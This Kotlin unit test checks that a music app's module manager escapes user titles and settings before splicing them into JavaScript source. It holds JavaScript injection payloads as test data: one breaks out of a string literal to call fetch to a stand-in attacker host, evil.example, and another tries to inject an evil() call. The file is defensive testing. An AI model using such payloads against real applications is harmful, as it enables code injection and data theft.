package com.music.laya

import com.music.laya.data.sources.module.ModuleManager
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonPrimitive
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Test

/** Arguments are spliced into module JS source, so hostile text must stay one string literal. */
class ModuleArgsTest {
    private val manager = ModuleManager()

    @Test
    fun aHostileTitleStaysOneStringLiteral() {
        val title = "Song\"); fetch('https://evil.example/'+x); (\"\n\\ \u2028end"
        val literal = manager.jsString(title)
        // Round-trips to the exact text, so nothing escaped the quotes.
        assertEquals(title, Json.parseToJsonElement(literal).jsonPrimitive.content)
        assertFalse("raw line separator would end a pre-ES2019 literal", '\u2028' in literal)
        assertFalse("raw newline", '\n' in literal)
    }

    @Test
    fun settingsAreEscapedToo() {
        val context = manager.contextArg(mapOf("quality" to "LOSSLESS\"}}); evil(); ({x:{y:\""))
        assertEquals(
            "{settings:{\"quality\":{\"value\":\"LOSSLESS\\\"}}); evil(); ({x:{y:\\\"\"}}}",
            context,
        )
    }
}
